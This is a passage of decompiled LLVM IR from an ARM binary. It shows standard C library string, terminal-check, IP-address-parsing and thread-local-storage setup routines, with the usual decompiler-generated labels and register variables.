  br i1 %v9_15ed0, label %dec_label_pc_15efc, label %dec_label_pc_15edc

dec_label_pc_15edc:                               ; preds = %dec_label_pc_15ecc
  %v2_15edc = icmp eq i8 %v3_15ecc, 0
  br i1 %v2_15edc, label %dec_label_pc_15efc, label %dec_label_pc_15ee4

dec_label_pc_15ee4:                               ; preds = %dec_label_pc_15edc
  %v1_15ee4 = add i32 %v0_15ebc, 3
  %v2_15ee4 = inttoptr i32 %v1_15ee4 to i8*
  %v3_15ee4 = load i8, i8* %v2_15ee4, align 1
  %v4_15ee4 = zext i8 %v3_15ee4 to i32
  %v9_15ee8 = icmp eq i32 %v4_15ee4, %v1_15e24
  br i1 %v9_15ee8, label %dec_label_pc_15efc, label %dec_label_pc_15ef4

dec_label_pc_15ef4:                               ; preds = %dec_label_pc_15ee4
  %v2_15ef4 = icmp eq i8 %v3_15ee4, 0
  br i1 %v2_15ef4, label %dec_label_pc_15efc, label %dec_label_pc_15e58

dec_label_pc_15efc:                               ; preds = %dec_label_pc_15e38, %dec_label_pc_15e2c, %dec_label_pc_15ef4, %dec_label_pc_15ee4, %dec_label_pc_15edc, %dec_label_pc_15ecc, %dec_label_pc_15ec4, %dec_label_pc_15eb4, %dec_label_pc_15eac, %dec_label_pc_15e9c
  %v1_15f00 = phi i32 [ %v1_15ee4, %dec_label_pc_15ef4 ], [ %v1_15ee4, %dec_label_pc_15ee4 ], [ %v1_15ecc, %dec_label_pc_15edc ], [ %v1_15ecc, %dec_label_pc_15ecc ], [ %v1_15eb4, %dec_label_pc_15ec4 ], [ %v1_15eb4, %dec_label_pc_15eb4 ], [ %v0_15ebc, %dec_label_pc_15eac ], [ %v0_15ebc, %dec_label_pc_15e9c ], [ %v0_15e40, %dec_label_pc_15e2c ], [ %v0_15e40, %dec_label_pc_15e38 ]
  ret i32 %v1_15f00

; uselistorder directives
  uselistorder i32 %v4_15e58, { 1, 0 }
  uselistorder i32 %v2_15e58, { 0, 2, 1 }
  uselistorder i32 %v0_15ebc, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_15e4c, { 1, 0 }
  uselistorder i32 %v1_15e40, { 1, 0, 2 }
  uselistorder i32 %v0_15e442, { 2, 1, 0 }
  uselistorder i32 %v1_15e24, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 2130640639, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_15efc, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_15e9c, { 1, 0 }
  uselistorder label %dec_label_pc_15e2c, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_15f0c = load i32, i32* @r4, align 4
  store i32 %v3_15f0c, i32* %stack_var_-16, align 4
  %v6_15f0c = load i32, i32* @r5, align 4
  %v9_15f0c = load i32, i32* @r6, align 4
  %v0_15f10 = load i32, i32* @r0, align 4
  %v0_15f14 = load i32, i32* @r1, align 4
  store i32 %v0_15f14, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_15f308 = inttoptr i32 %v0_15f10 to i8*
  %v2_15f309 = load i8, i8* %v1_15f308, align 1
  %v3_15f3010 = zext i8 %v2_15f309 to i32
  store i32 %v3_15f3010, i32* @r1, align 4
  %v2_15f3411 = icmp eq i8 %v2_15f309, 0
  store i32 %v0_15f14, i32* @r0, align 4
  %v1_15f3c12 = add i32 %v0_15f10, 1
  store i32 %v1_15f3c12, i32* @r4, align 4
  br i1 %v2_15f3411, label %dec_label_pc_15f44, label %dec_label_pc_15f20

dec_label_pc_15f20:                               ; preds = %entry, %dec_label_pc_15f2c
  %v3_15f3014 = phi i32 [ %v3_15f30, %dec_label_pc_15f2c ], [ %v3_15f3010, %entry ]
  %v0_15f3813 = phi i32 [ %v0_15f38.pre, %dec_label_pc_15f2c ], [ %v0_15f14, %entry ]
  %v2_15f20 = call i32 @__GI_strchr(i32 %v0_15f3813, i32 %v3_15f3014)
  %v2_15f24 = icmp eq i32 %v2_15f20, 0
  %v0_15f2c = load i32, i32* @r5, align 4
  br i1 %v2_15f24, label %dec_label_pc_15f2c, label %dec_label_pc_15f44

dec_label_pc_15f2c:                               ; preds = %dec_label_pc_15f20
  %v1_15f2c = add i32 %v0_15f2c, 1
  %v0_15f30.pre = load i32, i32* @r4, align 4
  %v0_15f38.pre = load i32, i32* @r6, align 4
  store i32 %v1_15f2c, i32* @r5, align 4
  %v1_15f30 = inttoptr i32 %v0_15f30.pre to i8*
  %v2_15f30 = load i8, i8* %v1_15f30, align 1
  %v3_15f30 = zext i8 %v2_15f30 to i32
  store i32 %v3_15f30, i32* @r1, align 4
  %v2_15f34 = icmp eq i8 %v2_15f30, 0
  store i32 %v0_15f38.pre, i32* @r0, align 4
  %v1_15f3c = add i32 %v0_15f30.pre, 1
  store i32 %v1_15f3c, i32* @r4, align 4
  br i1 %v2_15f34, label %dec_label_pc_15f44, label %dec_label_pc_15f20

dec_label_pc_15f44:                               ; preds = %dec_label_pc_15f2c, %dec_label_pc_15f20, %entry
  %v0_15f44 = phi i32 [ 0, %entry ], [ %v0_15f2c, %dec_label_pc_15f20 ], [ %v1_15f2c, %dec_label_pc_15f2c ]
  %v2_15f48 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15f48, i32* @r4, align 4
  store i32 %v6_15f0c, i32* @r5, align 4
  store i32 %v9_15f0c, i32* @r6, align 4
  ret i32 %v0_15f44

; uselistorder directives
  uselistorder i32 %v3_15f30, { 1, 0 }
  uselistorder i32 %v0_15f38.pre, { 1, 0 }
  uselistorder i32 %v0_15f30.pre, { 1, 0 }
  uselistorder label %dec_label_pc_15f20, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_15f54 = urem i32 %arg2, 256
  store i32 %v1_15f54, i32* @r4, align 4
  %v2_15f54 = icmp eq i32 %v1_15f54, 0
  br i1 %v2_15f54, label %dec_label_pc_15f68, label %dec_label_pc_15f7c.preheader

dec_label_pc_15f7c.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_15f843 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_15f54)
  %v2_15f885 = icmp eq i32 %v2_15f843, 0
  br i1 %v2_15f885, label %dec_label_pc_15f90, label %dec_label_pc_15f74

dec_label_pc_15f68:                               ; preds = %entry
  %v2_15f6c = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_15f94

dec_label_pc_15f74:                               ; preds = %dec_label_pc_15f7c.preheader, %dec_label_pc_15f74
  %v2_15f846 = phi i32 [ %v2_15f84, %dec_label_pc_15f74 ], [ %v2_15f843, %dec_label_pc_15f7c.preheader ]
  store i32 %v2_15f846, i32* @r5, align 4
  %v1_15f78 = add i32 %v2_15f846, 1
  store i32 %v1_15f78, i32* @r0, align 4
  %v0_15f80 = load i32, i32* @r4, align 4
  %v2_15f84 = call i32 @__GI_strchr(i32 %v1_15f78, i32 %v0_15f80)
  %v2_15f88 = icmp eq i32 %v2_15f84, 0
  br i1 %v2_15f88, label %dec_label_pc_15f90, label %dec_label_pc_15f74

dec_label_pc_15f90:                               ; preds = %dec_label_pc_15f74, %dec_label_pc_15f7c.preheader
  %v0_15f90 = load i32, i32* @r5, align 4
  br label %dec_label_pc_15f94

dec_label_pc_15f94:                               ; preds = %dec_label_pc_15f68, %dec_label_pc_15f90
  %storemerge = phi i32 [ %v2_15f6c, %dec_label_pc_15f68 ], [ %v0_15f90, %dec_label_pc_15f90 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_15f84, { 1, 0 }
  uselistorder i32 %v1_15f78, { 1, 0 }
  uselistorder i32 %v1_15f54, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_15f94, { 1, 0 }
  uselistorder label %dec_label_pc_15f74, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v0_15fd02 = load i32, i32* @r0, align 4
  %v1_15fd03 = inttoptr i32 %v0_15fd02 to i8*
  %v2_15fd04 = load i8, i8* %v1_15fd03, align 1
  %v2_15fd46 = icmp eq i8 %v2_15fd04, 0
  br i1 %v2_15fd46, label %dec_label_pc_15fe0, label %dec_label_pc_15fb4.preheader

dec_label_pc_15fac:                               ; preds = %dec_label_pc_15fb4
  %v1_15fbc = add i32 %v0_15fbc, 1
  %v9_15fac = icmp eq i8 %v0_15fac10.in, %v2_15fb4
  br i1 %v9_15fac, label %dec_label_pc_15fc8, label %dec_label_pc_15fb4

dec_label_pc_15fb4:                               ; preds = %dec_label_pc_15fb4.preheader, %dec_label_pc_15fac
  %v0_15fbc = phi i32 [ %tmp, %dec_label_pc_15fb4.preheader ], [ %v1_15fbc, %dec_label_pc_15fac ]
  %v1_15fb4 = inttoptr i32 %v0_15fbc to i8*
  %v2_15fb4 = load i8, i8* %v1_15fb4, align 1
  %v2_15fb8 = icmp eq i8 %v2_15fb4, 0
  br i1 %v2_15fb8, label %dec_label_pc_15fe0, label %dec_label_pc_15fac

dec_label_pc_15fc8:                               ; preds = %dec_label_pc_15fac
  %v1_15fc8 = add i32 %v0_15fc8, 1
  %v1_15fcc = add i32 %v0_15fcc, 1
  %v1_15fd0 = inttoptr i32 %v1_15fcc to i8*
  %v2_15fd0 = load i8, i8* %v1_15fd0, align 1
  %v2_15fd4 = icmp eq i8 %v2_15fd0, 0
  br i1 %v2_15fd4, label %dec_label_pc_15fe0, label %dec_label_pc_15fb4.preheader

dec_label_pc_15fb4.preheader:                     ; preds = %entry, %dec_label_pc_15fc8
  %v0_15fcc = phi i32 [ %v1_15fcc, %dec_label_pc_15fc8 ], [ %v0_15fd02, %entry ]
  %v0_15fc8 = phi i32 [ %v1_15fc8, %dec_label_pc_15fc8 ], [ 0, %entry ]
  %v0_15fac10.in = phi i8 [ %v2_15fd0, %dec_label_pc_15fc8 ], [ %v2_15fd04, %entry ]
  br label %dec_label_pc_15fb4

dec_label_pc_15fe0:                               ; preds = %dec_label_pc_15fc8, %dec_label_pc_15fb4, %entry
  %v0_15fe0 = phi i32 [ 0, %entry ], [ %v0_15fc8, %dec_label_pc_15fb4 ], [ %v1_15fc8, %dec_label_pc_15fc8 ]
  ret i32 %v0_15fe0

; uselistorder directives
  uselistorder i8 %v2_15fb4, { 1, 0 }
  uselistorder i32 %v0_15fbc, { 1, 0 }
  uselistorder label %dec_label_pc_15fb4.preheader, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_15ff4 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_15ff4, i32* @r1, align 4
  %v0_15ff8 = call i32 @__GI_tcgetattr()
  %v1_15ffc = sub i32 1, %v0_15ff8
  %v2_15ffc = icmp ult i32 %v0_15ff8, 2
  br i1 %v2_15ffc, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_1600c = phi i32 [ %v1_15ffc, %entry ], [ 0, %bb ]
  ret i32 %v1_1600c

; uselistorder directives
  uselistorder i32 %v0_15ff8, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_16010 = load i32, i32* @r4, align 4
  %v6_16010 = load i32, i32* @r5, align 4
  %v9_16010 = load i32, i32* @r6, align 4
  %v2_16018 = ptrtoint i32* %stack_var_-52 to i32
  %v0_1601c = load i32, i32* @r1, align 4
  store i32 %v0_1601c, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_16028 = load i32, i32* @r0, align 4
  %v3_16028 = call i32 @ioctl(i32 %v0_16028, i32 21505, i32 %v2_16018)
  store i32 %v3_16028, i32* %r0.global-to-local, align 4
  store i32 %v3_16028, i32* @r5, align 4
  %v2_1602c = icmp eq i32 %v3_16028, 0
  br i1 %v2_1602c, label %dec_label_pc_16034, label %dec_label_pc_16078

dec_label_pc_16034:                               ; preds = %entry
  %v4_16040 = zext i8 %tmp to i32
  store i32 %v4_16040, i32* @ip, align 4
  %v3_16044 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_16044, i32* @r3, align 4
  %v1_16048 = load i32, i32* @r4, align 4
  %v2_16048 = add i32 %v1_16048, 4
  %v3_16048 = inttoptr i32 %v2_16048 to i32*
  %v0_1604c = load i32, i32* %r1.global-to-local, align 4
  %v1_1604c = load i32, i32* @r4, align 4
  %v2_1604c = add i32 %v1_1604c, 8
  %v3_1604c = inttoptr i32 %v2_1604c to i32*
  store i32 %v0_1604c, i32* %v3_1604c, align 4
  %v0_16050 = load i32, i32* %r0.global-to-local, align 4
  %v1_16050 = load i32, i32* @r4, align 4
  %v2_16050 = add i32 %v1_16050, 12
  %v3_16050 = inttoptr i32 %v2_16050 to i32*
  store i32 %v0_16050, i32* %v3_16050, align 4
  %v2_16054 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_16054, i32* @r1, align 4
  %v1_1605c = load i32, i32* @r4, align 4
  %v2_1605c = inttoptr i32 %v1_1605c to i32*
  store i32 %v3_16044, i32* %v2_1605c, align 4
  %v0_16060 = load i32, i32* @ip, align 4
  %v1_16060 = trunc i32 %v0_16060 to i8
  %v2_16060 = load i32, i32* @r4, align 4
  %v3_16060 = add i32 %v2_16060, 16
  %v4_16060 = inttoptr i32 %v3_16060 to i8*
  store i8 %v1_16060, i8* %v4_16060, align 1
  %v0_16064 = load i32, i32* @r4, align 4
  %v1_16064 = add i32 %v0_16064, 17
  store i32 %v1_16064, i32* %r0.global-to-local, align 4
  %v4_16068 = call i32 @__GI_mempcpy(i32 %v1_16064, i32 %v2_16054, i32 19, i32 %v3_16044)
  store i32 %v4_16068, i32* %r0.global-to-local, align 4
  %v0_1606c = load i32, i32* @r5, align 4
  store i32 %v0_1606c, i32* %r1.global-to-local, align 4
  %v3_16074 = inttoptr i32 %v4_16068 to i8*
  %v4_16074 = call i32 @__GI_memset(i8* %v3_16074, i32 %v0_1606c, i32 13)
  store i32 %v4_16074, i32* %r0.global-to-local, align 4
  %v0_16078.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16078

dec_label_pc_16078:                               ; preds = %entry, %dec_label_pc_16034
  %v0_16078 = phi i32 [ %v3_16028, %entry ], [ %v0_16078.pre, %dec_label_pc_16034 ]
  store i32 %v0_16078, i32* %r0.global-to-local, align 4
  store i32 %v3_16010, i32* @r4, align 4
  store i32 %v6_16010, i32* @r5, align 4
  store i32 %v9_16010, i32* @r6, align 4
  ret i32 %v0_16078

; uselistorder directives
  uselistorder i32 %v0_16078, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 17, { 10, 1, 2, 11, 12, 3, 13, 4, 14, 5, 15, 16, 17, 6, 18, 7, 8, 19, 9, 20, 21, 22, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16078, { 1, 0 }
}

define i32 @inet_aton() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1608c = load i32, i32* @r4, align 4
  store i32 %v3_1608c, i32* %stack_var_-28, align 4
  %v0_16094 = load i32, i32* @r0, align 4
  %v2_16094 = icmp eq i32 %v0_16094, 0
  %v0_1609c = load i32, i32* @r1, align 4
  br i1 %v2_16094, label %dec_label_pc_16170, label %dec_label_pc_160a4

dec_label_pc_160a4:                               ; preds = %entry
  br label %dec_label_pc_160bc

dec_label_pc_160bc:                               ; preds = %dec_label_pc_160a4, %dec_label_pc_16134
  %v1_16134 = phi i32 [ 0, %dec_label_pc_160a4 ], [ %v5_16134, %dec_label_pc_16134 ]
  %v0_16138 = phi i32 [ 1, %dec_label_pc_160a4 ], [ %v1_16138, %dec_label_pc_16134 ]
  %v0_160bc = phi i32 [ %v0_16094, %dec_label_pc_160a4 ], [ %v0_160bc13, %dec_label_pc_16134 ]
  %v1_160bc = inttoptr i32 %v0_160bc to i8*
  %v2_160bc = load i8, i8* %v1_160bc, align 1
  %v3_160bc = zext i8 %v2_160bc to i32
  %v4_160c0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 276) to i32*), align 4
  %v2_160c4 = mul nuw nsw i32 %v3_160bc, 2
  %v2_160c8 = add i32 %v2_160c4, %v4_160c0
  %v3_160c8 = inttoptr i32 %v2_160c8 to i16*
  %v4_160c8 = load i16, i16* %v3_160c8, align 2
  %v1_160cc = and i16 %v4_160c8, 8
  %v2_160cc = icmp eq i16 %v1_160cc, 0
  br i1 %v2_160cc, label %dec_label_pc_16170, label %dec_label_pc_160d4

dec_label_pc_160d4:                               ; preds = %dec_label_pc_160bc
  br label %dec_label_pc_160f4

dec_label_pc_160dc:                               ; preds = %dec_label_pc_160f4
  %v2_160dc = mul i32 %v0_16134, 10
  %v1_160e0 = add i32 %v2_160dc, -48
  %v2_160e4 = add i32 %v3_160f4, %v1_160e0
  %v8_160ec = icmp sgt i32 %v2_160e4, 255
  br i1 %v8_160ec, label %dec_label_pc_16170, label %dec_label_pc_160f0

dec_label_pc_160f0:                               ; preds = %dec_label_pc_160dc
  %v1_160f0 = add i32 %v0_16124, 1
  store i32 %v1_160f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_160f4

dec_label_pc_160f4:                               ; preds = %dec_label_pc_160d4, %dec_label_pc_160f0
  %v0_16134 = phi i32 [ 0, %dec_label_pc_160d4 ], [ %v2_160e4, %dec_label_pc_160f0 ]
  %v0_16124 = phi i32 [ %v0_160bc, %dec_label_pc_160d4 ], [ %v1_160f0, %dec_label_pc_160f0 ]
  %v1_160f4 = inttoptr i32 %v0_16124 to i8*
  %v2_160f4 = load i8, i8* %v1_160f4, align 1
  %v3_160f4 = zext i8 %v2_160f4 to i32
  %v2_160f8 = mul nuw nsw i32 %v3_160f4, 2
  %v2_160fc = add i32 %v2_160f8, %v4_160c0
  %v3_160fc = inttoptr i32 %v2_160fc to i16*
  %v4_160fc = load i16, i16* %v3_160fc, align 2
  %v6_160fc = zext i16 %v4_160fc to i32
  %v1_16100 = and i32 %v6_160fc, 8
  %v2_16100 = icmp eq i32 %v1_16100, 0
  br i1 %v2_16100, label %dec_label_pc_16108, label %dec_label_pc_160dc

dec_label_pc_16108:                               ; preds = %dec_label_pc_160f4
  %v7_16108 = icmp eq i32 %v0_16138, 4
  br i1 %v7_16108, label %dec_label_pc_16120, label %dec_label_pc_16110

dec_label_pc_16110:                               ; preds = %dec_label_pc_16108
  %v7_16110 = icmp eq i8 %v2_160f4, 46
  br i1 %v7_16110, label %dec_label_pc_16118, label %dec_label_pc_16170

dec_label_pc_16118:                               ; preds = %dec_label_pc_16110
  %v1_16118 = add i32 %v0_16124, 1
  store i32 %v1_16118, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16134

dec_label_pc_16120:                               ; preds = %dec_label_pc_16108
  %v2_16120 = icmp eq i8 %v2_160f4, 0
  %v1_16124 = add i32 %v0_16124, 1
  store i32 %v1_16124, i32* %r0.global-to-local, align 4
  br i1 %v2_16120, label %dec_label_pc_16134, label %dec_label_pc_1612c

dec_label_pc_1612c:                               ; preds = %dec_label_pc_16120
  %v1_1612c = and i32 %v6_160fc, 32
  %v2_1612c = icmp eq i32 %v1_1612c, 0
  br i1 %v2_1612c, label %dec_label_pc_16170, label %dec_label_pc_16134

dec_label_pc_16134:                               ; preds = %dec_label_pc_1612c, %dec_label_pc_16120, %dec_label_pc_16118
  %v0_160bc13 = phi i32 [ %v1_16124, %dec_label_pc_1612c ], [ %v1_16124, %dec_label_pc_16120 ], [ %v1_16118, %dec_label_pc_16118 ]
  %v4_16134 = mul i32 %v1_16134, 256
  %v5_16134 = or i32 %v0_16134, %v4_16134
  %v1_16138 = add nuw nsw i32 %v0_16138, 1
  %v7_16140 = icmp slt i32 %v1_16138, 5
  br i1 %v7_16140, label %dec_label_pc_160bc, label %dec_label_pc_16144

dec_label_pc_16144:                               ; preds = %dec_label_pc_16134
  %v2_16144 = icmp eq i32 %v0_1609c, 0
  br i1 %v2_16144, label %.thread8.thread, label %bb

.thread8.thread:                                  ; preds = %dec_label_pc_16144
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16174

bb:                                               ; preds = %dec_label_pc_16144
  %v4_16148 = udiv i32 %v5_16134, 16777216
  %v2_1614c = udiv i32 %v5_16134, 256
  %v5_16150 = and i32 %v2_1614c, 65280
  %v2_16154 = and i32 %v5_16134, ptrtoint (i32* @global_var_ff00.28 to i32)
  %v5_16158 = mul i32 %v2_16154, 256
  %v5_1615c = mul i32 %v0_16134, 16777216
  %v6_16150 = or i32 %v4_16148, %v5_1615c
  %v6_16158 = or i32 %v6_16150, %v5_16150
  %v6_1615c = or i32 %v6_16158, %v5_16158
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_16168 = inttoptr i32 %v0_1609c to i32*
  store i32 %v6_1615c, i32* %v3_16168, align 4
  %v2_16174.pre = load i32, i32* %stack_var_-28, align 4
  %v1_16178.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16174

dec_label_pc_16170:                               ; preds = %dec_label_pc_16110, %dec_label_pc_1612c, %dec_label_pc_160bc, %dec_label_pc_160dc, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16174

dec_label_pc_16174:                               ; preds = %.thread8.thread, %bb, %dec_label_pc_16170
  %v1_16178 = phi i32 [ %v1_16178.pre, %bb ], [ 0, %dec_label_pc_16170 ], [ 1, %.thread8.thread ]
  %v2_16174 = phi i32 [ %v2_16174.pre, %bb ], [ %v3_1608c, %dec_label_pc_16170 ], [ %v3_1608c, %.thread8.thread ]
  store i32 %v2_16174, i32* @r4, align 4
  ret i32 %v1_16178

; uselistorder directives
  uselistorder i32 %v1_16138, { 1, 0 }
  uselistorder i32 %v5_16134, { 2, 0, 1, 3 }
  uselistorder i32 %v0_16124, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_ff00.28 to i32), { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 16, 17, 18 }
  uselistorder i32 65280, { 0, 2, 8, 1, 3, 9, 10, 11, 12, 13, 39, 45, 14, 15, 16, 46, 17, 18, 19, 20, 40, 4, 5, 47, 21, 22, 41, 48, 42, 23, 24, 25, 26, 27, 7, 49, 43, 6, 50, 28, 51, 29, 30, 31, 32, 44, 33, 34, 35, 52, 36, 37, 38 }
  uselistorder i8 46, { 0, 2, 1 }
  uselistorder i32 255, { 4, 5, 0, 1, 2, 7, 9, 8, 10, 6, 11, 3 }
  uselistorder i16 0, { 0, 1, 3, 4, 5, 2, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder label %dec_label_pc_16174, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16170, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_160f4, { 1, 0 }
  uselistorder label %dec_label_pc_160bc, { 1, 0 }
}

define i32 @init_static_tls() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v3_16190 = load i32, i32* @r4, align 4
  store i32 %v3_16190, i32* %stack_var_-16, align 4
  %v4_16194 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 72) to i32*), align 4
  store i32 60, i32* %r3.global-to-local, align 4
  %v4_1619c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 60) to i32*), align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_161a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 36) to i32*), align 4
  store i32 %v4_161a4, i32* %r4.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  %v1_161ac = inttoptr i32 %v4_16194 to i32*
  %v2_161ac = load i32, i32* %v1_161ac, align 4
  %v4_161b0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 52) to i32*), align 4
  store i32 %v4_161b0, i32* %lr.global-to-local, align 4
  store i32 144, i32* %r3.global-to-local, align 4
  %v1_161b8 = add i32 %v2_161ac, 15
  %v4_161bc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 144) to i32*), align 4
  store i32 %v4_161bc, i32* @ip, align 4
  %v1_161c0 = load i32, i32* @r0, align 4
  %v2_161c0 = add i32 %v1_161c0, %v1_161b8
  %v1_161c4 = inttoptr i32 %v4_1619c to i32*
  %v2_161c4 = load i32, i32* %v1_161c4, align 4
  store i32 %v2_161c4, i32* %r3.global-to-local, align 4
  %v1_161c8 = and i32 %v2_161c0, -16
  store i32 %v1_161c8, i32* %v1_161ac, align 4
  %v0_161d0 = load i32, i32* @r0, align 4
  %v1_161d0 = load i32, i32* %r4.global-to-local, align 4
  %v2_161d0 = inttoptr i32 %v1_161d0 to i32*
  store i32 %v0_161d0, i32* %v2_161d0, align 4
  %v0_161d4 = load i32, i32* @r1, align 4
  %v1_161d4 = load i32, i32* %lr.global-to-local, align 4
  %v2_161d4 = inttoptr i32 %v1_161d4 to i32*
  store i32 %v0_161d4, i32* %v2_161d4, align 4
  %v0_161d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_161d8 = load i32, i32* @ip, align 4
  %v2_161d8 = inttoptr i32 %v1_161d8 to i32*
  store i32 %v0_161d8, i32* %v2_161d8, align 4
  %v2_161dc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_161dc, i32* %r4.global-to-local, align 4
  %v1_161e0 = load i32, i32* @r0, align 4
  ret i32 %v1_161e0

; uselistorder directives
  uselistorder i32 -16, { 21, 6, 7, 8, 9, 10, 11, 12, 13, 14, 5, 4, 3, 1, 15, 16, 17, 18, 19, 20, 2, 0 }
}

define i32 @function_161e8(i32 %arg1) local_unnamed_addr {
dec_label_pc_161e8:
  %v0_161e8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_161e8, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_161e8
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_161e8, %bb
  %v4_161f8 = phi i32 [ %arg1, %dec_label_pc_161e8 ], [ 0, %bb ]
  ret i32 %v4_161f8

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @_dl_tls_setup(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %r3.global-to-local, align 4
  %v4_1620c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 84) to i32*), align 4
  store i32 %v4_1620c, i32* @lr, align 4
  %v4_16218 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 60) to i32*), align 4
  store i32 64, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 10744) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 10744), i32* %r3.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  store i32 16, i32* @r1, align 4
  %v2_16238 = inttoptr i32 %v4_16218 to i32*
  store i32 1, i32* %v2_16238, align 4
  %v0_1623c = load i32, i32* %r3.global-to-local, align 4
  %v1_1623c = load i32, i32* @lr, align 4
  %v2_1623c = inttoptr i32 %v1_1623c to i32*
  store i32 %v0_1623c, i32* %v2_1623c, align 4
  %v0_16240 = call i32 @init_static_tls()
  ret i32 0
}

define i32 @function_16258(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_16258:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_16258 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16258, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_16258
  %v2_16258 = load i32, i32* @r4, align 4
  %v8_16258 = ashr i32 %v2_16258, %tmp
  %v9_16258 = and i32 %v8_16258, %tmp
  %v2_1625c = load i32, i32* @ip, align 4
  %v8_1625c = lshr i32 %v2_1625c, %v9_16258
  %v9_1625c = and i32 %v8_1625c, %v9_16258
  store i32 %v9_1625c, i32* %r0.global-to-local, align 4
  %v4_16260 = inttoptr i32 %v9_1625c to i32*
  store i32 %arg2, i32* %v4_16260, align 4
  %v5_16260 = load i32, i32* @r8, align 4
  %v6_16260 = load i32, i32* %r0.global-to-local, align 4
  %v7_16260 = sub i32 %v6_16260, %v5_16260
  store i32 %v7_16260, i32* %r0.global-to-local, align 4
  br label %.thread1

